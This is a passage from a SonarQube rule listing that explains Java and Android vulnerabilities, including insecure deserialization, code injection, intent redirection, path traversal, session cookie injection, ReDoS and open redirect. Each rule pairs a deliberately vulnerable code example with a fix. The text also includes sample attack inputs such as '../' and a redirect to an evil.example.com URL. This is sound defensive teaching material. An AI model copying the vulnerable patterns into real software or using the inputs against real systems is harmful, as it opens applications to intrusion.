<p>In the worst-case scenario, the attackers succeed in injecting an object of a completely different class than expected, triggering code
execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul>
  <li> Download the internal server’s data, most likely to sell it. </li>
  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>
  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to
elevate his privileges as an administrator and attack other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
through a combination of unsafe deserialization and misconfiguration:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to deserialization attacks because it deserializes HTTP data without validating it first.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class RequestProcessor {
  protected void doGet(HttpServletRequest request, HttpServletResponse response) {
    ServletInputStream servletIS = request.getInputStream();
    ObjectInputStream  objectIS  = new ObjectInputStream(servletIS);
    Object input                 = objectIS.readObject();
  }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class SecureObjectInputStream extends ObjectInputStream {

  @Override
  protected Class&lt;?&gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException {

    List&lt;String&gt; approvedClasses = new ArrayList&lt;String&gt;();
    approvedClasses.add(AllowedClass1.class.getName());
    approvedClasses.add(AllowedClass2.class.getName());

    if (!approvedClasses.contains(osc.getName())) {
      throw new InvalidClassException("Unauthorized deserialization", osc.getName());
    }

    return super.resolveClass(osc);
  }
}

public class RequestProcessor {
  protected void doGet(HttpServletRequest request, HttpServletResponse response) {
    ServletInputStream servletIS = request.getInputStream();
    ObjectInputStream  objectIS  = new SecureObjectInputStream(servletIS);
    Object input                 = objectIS.readObject();
  }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to provide data for deserialization generally creates more problems than it solves.</p>
<p>Anything that can be done through deserialization can generally be done with more secure data structures.<br> Therefore, our first suggestion is to
avoid deserialization in the first place.</p>
<p>However, if deserialization mechanisms are valid in your context, here are some security suggestions.</p>
<h4>More secure serialization methods</h4>
<p>Some more secure serialization methods reduce the risk of security breaches, although not definitively.</p>
<p>A complete object serializer is probably unnecessary if you only need to receive primitive data (for example integers, strings, bools, etc.).<br>
In this case, formats such as JSON and XML protect the application from deserialization attacks by default.</p>
<p>For more complex objects, the next step is to control which class fields are exposed by creating class-specific serialization methods.<br> The most
common method is to use Data Transfer Objects (DTO) patterns or Google Protocol Buffers (protobufs). After creating the Protobuf data structure, the
Protobuf compiler creates class files that handle operations such as serializing and deserializing data.</p>
<h4>Integrity check</h4>
<p>Message authentication codes (MAC) can be used to prevent tampering with serialized data that is meant to be stored outside the application
server:</p>
<ul>
  <li> On the server-side, when serializing an object, compute a MAC of the result and append it to the serialized object string. </li>
  <li> When the serialized value is submitted back, verify the serialization string MAC on the server side before deserialization. </li>
</ul>
<p>Depending on the situation, two MAC computation modes can be used.</p>
<p>If the same application will be responsible for the MAC computing and validation, a symmetric signature algorithm can be used. In that case, HMAC
should be preferred, with a strong underlying hash algorithm such as SHA-256.</p>
<p>If multiple parties have to validate the serialized data, an asymetric signature algorithm should be used. This will reduce the chances for a
signing secret to be leaked. In that case, the <code>RSASSA-PSS</code> algorithm can be used.</p>
<p><strong>Note</strong>: Be sure to store the signing secret securely.</p>
<h4>Pre-Approved classes</h4>
<p>As a last resort, create a list of approved and safe classes that the application should be able to deserialize.<br> If the untrusted class does
not match an entry in this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Note</strong>: Untrusted classes should be filtered out <strong>during</strong> deserialization, not after.<br> Depending on the language
or framework, this should be possible by overriding the serialization process or using native capabilities to restrict type deserialization.</p>
<p>In the previous example, the pre-approved list uses class names to validate the deserialized class.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/">Top 10 2021 Category A8 - Software and Data Integrity
  Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">Top 10 2017 Category A8 - Insecure
  Deserialization</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/502">CWE-502 - Deserialization of Untrusted Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5334">
              javasecurity:S5334
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br> An attacker can influence the
behavior of the targeted application and modify it to get access to sensitive data.</p>
<h3>What is the potential impact?</h3>
<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable
application.</p>
<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code
runs with root privileges, and therefore any OS commands or programs may be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Denial of service and data leaks</h4>
<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>
<p>An attacker could, for example:</p>
<ul>
  <li> download the internal server’s data, most likely to sell it </li>
  <li> modify data, send malware </li>
  <li> stop services or exhaust resources (with fork bombs for example) </li>
</ul>
<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h4>Root privilege escalation and pivot</h4>
<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate
their privileges to an administrative level and attacks other servers.</p>
<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised
by a combination of code injections and <strong>misconfiguration</strong> of:</p>
<ul>
  <li> Docker or Kubernetes clusters </li>
  <li> cloud services </li>
  <li> network firewalls and routing </li>
  <li> OS access control </li>
</ul>
<h2>How to fix it in Commons Compiler</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to arbitrary code execution because it compiles and runs HTTP data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import org.codehaus.janino.ScriptEvaluator;

@Controller
public class ExampleController
{
    @GetMapping(value = "/")
    public void exec(@RequestParam("message") String message) throws IOException, InvocationTargetException {
        ScriptEvaluator se = new ScriptEvaluator();
        se.cook("System.out.println(\" + message \");");
        se.evaluate(null);
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import org.codehaus.janino.ScriptEvaluator;

@Controller
public class ExampleController
{
    @GetMapping(value = "/")
    public void exec(@RequestParam("message") String message) throws IOException, InvocationTargetException {
        ScriptEvaluator se = new ScriptEvaluator();
        se.setParameters(new String[] { "input" }, new Class[] { String.class });
        se.cook("System.out.println(input);");
        se.evaluate(new Object[] { message });
    }
}
</pre>
<h3>How does this work?</h3>
<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>
<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br> Therefore, our suggestion
is to avoid executing code dynamically.<br> If the application requires the execution of dynamic code, additional security measures must be taken.</p>
<h4>Dynamic parameters</h4>
<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the
dynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic
code and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and
perform the processing.</p>
<p>The compliant code example uses such an approach.</p>
<h4>Allow list</h4>
<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage
using an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>
<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the
parameter is accepted. Otherwise, it is rejected and an error is raised.</p>
<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where
only valid ones can be converted to a safe value.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/moodle-remote-code-execution/">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/95">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6384">
              javasecurity:S6384
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Intent redirection vulnerabilities occur when an application publicly exposes a feature that uses an externally provided intent to start a new
component.</p>
<p>In that case, an application running on the same device as the affected one can launch the exposed, vulnerable component and provide it with a
specially crafted intent. Depending on the application’s configuration and logic, this intent will be used in the context of the vulnerable
application, which poses a security threat.</p>
<h3>What is the potential impact?</h3>
<p>An affected component that forwards a malicious externally provided intent does so using the vulnerable application’s context. In particular, the
new component is created with the same permissions as the application and without limitations on what feature can be reached.</p>
<p>Therefore, an attacker exploiting an intent redirection vulnerability could manage to access a private application’s components. Depending on the
features privately exposed, this can lead to further exploitations, sensitive data disclosure, or even persistent code execution.</p>
<h4>Information disclosure</h4>
<p>An attacker can use the affected feature as a gateway to access other components of the vulnerable application, even if they are not exported. This
includes features that handle sensitive information.</p>
<p>Therefore, by crafting a malicious intent and submitting it to the vulnerable redirecting component, an attacker can retrieve most data exposed by
private features. This affects the confidentiality of information that is not protected by an additional security mechanism, such as an encryption
algorithm.</p>
<h4>Attack surface increase</h4>
<p>Because the attacker can access most components of the application, they can identify and exploit other vulnerabilities that would be present in
them. The actual impact depends on the nested vulnerability. Exploitation probability depends on the in-depth security level of the application.</p>
<h4>Privilege escalation</h4>
<p>If the vulnerable application has privileges on the underlying devices, an attacker exploiting the redirection issue might take advantage of them.
For example by crafting a malicious intent action, the attacker could be able to pass phone calls on behalf of the entitled application.</p>
<p>This can lead to various attack scenarios depending on the exploited permissions.</p>
<h4>Persistent code execution</h4>
<p>A lot of applications rely on dynamic code loading to implement a variety of features, such as:</p>
<ul>
  <li> Minor feature updates. </li>
  <li> Application package size reduction. </li>
  <li> DRM or other code protection features. </li>
</ul>
<p>When a component exposes a dynamic code loading feature, an attacker could use it during the redirection’s exploitation to deploy malicious code
into the application. The component can be located in the application itself or one of its dependencies.</p>
<p>Such an attack would compromise the application execution environment entirely and lead to multiple security threats. The malicious code could:</p>
<ul>
  <li> Intercept and exfiltrate all data used in the application. </li>
  <li> Steal authentication credentials to third-party services. </li>
  <li> Change the application’s behavior to serve another malicious purpose (phishing, ransoming, etc) </li>
</ul>
<p>Note that in most cases, the deployed malware can persist application or hosting device restarts.</p>
<h2>How to fix it in Android</h2>
<h3>Code examples</h3>
<p>This code is vulnerable to intent injection attacks because it starts a new activity from a user-provided intent without prior validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public class Noncompliant extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Intent intent = getIntent();
        Intent forward = (Intent) intent.getParcelableExtra("anotherintent");
        startActivity(forward); // Noncompliant
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = getIntent();
        Intent forward = (Intent) intent.getParcelableExtra("anotherintent");

        ComponentName name = forward.resolveActivity(getPackageManager());
        if (name.getPackageName().equals("safePackage") &amp;&amp;
                name.getClassName().equals("safeClass")) {
            startActivity(forward);
        }
    }
}
</pre>
<h3>How does this work?</h3>
<p>In general, security best practices discourage forwarding intents. However, when the application requires such a feature, it should precisely check
the forwarded intents to ensure they do not pass malicious content.</p>
<p>Additionally, the components that are not meant to be accessed externally should be marked as non-exported in the application’s manifest. This is
done by setting the <code>android:exported</code> attribute of the components to <code>"false"</code>.</p>
<h4>Checking the intent destination</h4>
<p>Most unintended usage of the forwarding feature can be prevented by verifying whether the destination package and class names belong to a list of
accepted components.</p>
<p>The allow-list of accepted destinations should only contain components that perform non-sensitive actions and handle non-sensitive data. Moreover,
it should not allow reaching components that further redirect inner intents.</p>
<p>The example compliant code uses the <code>resolveActivity</code> method of the inner intent to determine its target component. It then uses the
<code>getPackageName</code> and <code>getClassName</code> methods to validate this destination is not sensitive.</p>
<h4>Checking the intent origin</h4>
<p>Before forwarding the intent, the application can check its origin. Verifying the origin package is trusted prevents the forwarding feature from
being used by an external component.</p>
<p>The <code>getCallingActivity</code> method of the forwarded intent can be used to determine the origin component.</p>
<h4>Permissions downgrade</h4>
<p>Before forwarding an intent to another component, the application can verify or remove the permissions set on the forwarded intent. In that case,
even if the destination is a sensitive component, the application can ensure the untrusted intent will not be able to read or write sensitive data or
locations.</p>
<p>In most cases, the application should drop the following permissions from untrusted intents:</p>
<ul>
  <li> FLAG_GRANT_READ_URI_PERMISSION </li>
  <li> FLAG_GRANT_WRITE_URI_PERMISSION </li>
</ul>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://support.google.com/faqs/answer/9267555?hl=en">support.google.com</a> - Remediation for Intent Redirection Vulnerability <a
  href="https://developer.android.com/topic/security/risks/intent-redirection">developer.android.com</a> - Intent redirection </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x11-v6-interaction_with_the_environment">Mobile AppSec
  Verification Standard - Platform Interaction Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m1-improper-platform-usage">Mobile Top 10 2016 Category M1 - Improper
  Platform Usage</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S2083">
              javasecurity:S2083
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting
path would resolve somewhere in the filesystem where the user should not normally have access to.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override or delete arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited
to remove or corrupt files that are critical for the application or for the system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h4>Read arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to
leak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>
<p>An attacker can exploit the vulnerability in this code to delete arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
@Controller
public class ExampleController
{
    static private String targetDirectory = "/path/to/target/directory/";

    @GetMapping(value = "/delete")
    public void delete(@RequestParam("filename") String filename) throws IOException {

        File file = new File(targetDirectory + filename);
        file.delete();
    }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
@Controller
public class ExampleController
{
    private static String targetDirectory = "/path/to/target/directory/";
    private static Path targetPath        = new File(targetDirectory).toPath().normalize();

    @GetMapping(value = "/delete")
    public void delete(@RequestParam("filename") String filename) throws IOException {

        File file = new File(targetPath + filename);

        if (!file.toPath().normalize().startsWith(targetPath)) {
            throw new IOException("Entry is outside of the target directory");
        }

        file.delete();
    }
}
</pre>
<h3>How does this work?</h3>
<h4>Canonical path validation</h4>
<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths
constructed from untrusted data:</p>
<ol>
  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>
  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li>
  <li> Resolve the canonical path of the file by using methods like <code>java.io.File.getCanonicalPath</code>. This will resolve relative path or
  path components like <code>../</code> and removes any ambiguity regarding the file’s location. </li>
  <li> Check that the canonical path is within the directory where the file should be located. </li>
</ol>
<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by
design:</p>
<ol>
  <li> <code>data = transform(user_input);</code> </li>
  <li> <code>data = normalize(data);</code> </li>
  <li> <code>data = sanitize(data);</code> </li>
  <li> <code>use(data);</code> </li>
</ol>
<p>As pointed out in <a href="https://www.youtube.com/watch?v=V-DdcKADnFk">this SonarSource talk</a>, failure to follow this exact order leads to
security vulnerabilities.</p>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path
separator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path
separator:</p>
<pre>
static private String targetDirectory = "/Users/John";

@GetMapping(value = "/endpoint")
public void endpoint(@RequestParam("folder") fileName) throws IOException {

    String canonicalizedFileName = fileName.getCanonicalPath();

    if (!canonicalizedFileName .startsWith(targetDirectory)) {
        throw new IOException("Entry is outside of the target directory");
    }
}
</pre>
<p>This check can be bypassed because <code>"/Users/Johnny".startsWith("/Users/John")</code> returns <code>true</code>. Thus, for validation,
<code>"/Users/John"</code> should actually be <code>"/Users/John/"</code>.</p>
<p><strong>Warning</strong>: Some functions, such as <code>.getCanonicalPath</code>, remove the terminating path separator in their return value.<br>
The validation code should be tested to ensure that it cannot be impacted by this issue.</p>
<p><a href="https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3">Here is a real-life example of this vulnerability.</a></p>
<h4>Do not use java.nio.file.Path.resolve as a validator</h4>
<p>As specified in the <a href="https://docs.oracle.com/javase/8/docs/api/java/nio/file/Path.html">official documentation</a>, if the given parameter
is an absolute path, the base object from which the method is called is discarded and is not included in the resulting string.</p>
<p>This means that including untrusted data in the parameter and using the resulting string for file operations may lead to a path traversal
vulnerability.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/22">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6287">
              javasecurity:S6287
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>
<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the
application.</p>
<p>The injection might occur via a GET parameter, and the payload, for example, <code><a
href="https://example.com?cookie=injectedcookie">https://example.com?cookie=injectedcookie</a></code>, delivered using phishing techniques.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a
session that isn’t theirs.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Sensitive data disclosure</h4>
<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of
implications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>
<h4>Vulnerability chaining</h4>
<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and
exploits a self-XSS on the target application.<br> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,
which can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
    Optional&lt;Cookie&gt; cookieOpt = Arrays.stream(request.getCookies())
                                    .filter(c -&gt; c.getName().equals("jsessionid"))
                                    .findFirst();

    if (!cookieOpt.isPresent()) {
        String cookie = request.getParameter("cookie");
        Cookie cookieObj = new Cookie("jsessionid", cookie);
        response.addCookie(cookieObj);
    }

    response.sendRedirect("/welcome.jsp");
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
    Optional&lt;Cookie&gt; cookieOpt = Arrays.stream(request.getCookies())
                                    .filter(c -&gt; c.getName().equals("jsessionid"))
                                    .findFirst();

    if (!cookieOpt.isPresent()) {
        response.sendRedirect("/getCookie.jsp");
    } else {
        response.sendRedirect("/welcome.jsp");
    }
}
</pre>
<h3>How does this work?</h3>
<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the
value of a session cookie to untrusted data.</p>
<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade
tools.<br> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to
use these solutions than to develop your own.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/384">CWE-384 - Session Fixation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S2631">
              javasecurity:S2631
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>
<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this
can lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to regex injection:<br> After discovering the injection point, attackers insert data into the
vulnerable field to make the affected component inaccessible.</p>
<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Self Denial of Service</h4>
<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)
can trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>
<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>
<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service might only affect the attacker who initiated it.</p>
<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems
would detect the failure of a container and automatically replace it.</p>
<h4>Infrastructure SPOFs</h4>
<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture
vulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient
container creation capabilities or failures from containers to terminate).</p>
<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge
offensive infrastructures.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to Regex Denial of Service because untrusted data is used as a regex to scan a string without prior
sanitization or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
public boolean validate(HttpServletRequest request) {
  String regex = request.getParameter("regex");
  String input = request.getParameter("input");

  return input.matches(regex);
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
public boolean validate(HttpServletRequest request) {
  String regex = request.getParameter("regex");
  String input = request.getParameter("input");

  return input.matches(Pattern.quote(regex));
}
</pre>
<h3>How does this work?</h3>
<h4>Sanitization and Validation</h4>
<p>Metacharacters escape using native functions is a solution against regex injection.<br> The escape function sanitizes the input so that the regular
expression engine interprets these characters literally.</p>
<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br>
If a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>
<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>
<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href="https://github.com/google/re2">re2</a>.</p>
<p>In the example, <code>Pattern.quote</code> escapes metacharacters and escape sequences that could have broken the initially intended logic.</p>
<h2>Resources</h2>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS">OWASP Regular expression Denial of Service - ReDoS</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1333">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S5146">
              javasecurity:S5146
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>
<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as
<code>https://trusted.example.com?url=evil.example.com</code>, to redirect the victim to his evil domain.</p>
<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker
to build a credible pretext to prevent suspicions from the victim.<br></p>
<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>
<h3>What is the potential impact?</h3>
<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>
<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Domain Mirroring</h4>
<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the
similarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a
malicious domain.<br></p>
<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any
authenticated data or action.</p>
<h4>Malware Distribution</h4>
<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the
attacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a
hosted malicious file.<br> The worst-case scenario could result in complete system compromise.</p>
<h2>How to fix it in Java SE</h2>
<h3>Code examples</h3>
<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used
to redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {
  String location = req.getParameter("url");
  resp.sendRedirect(location);
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
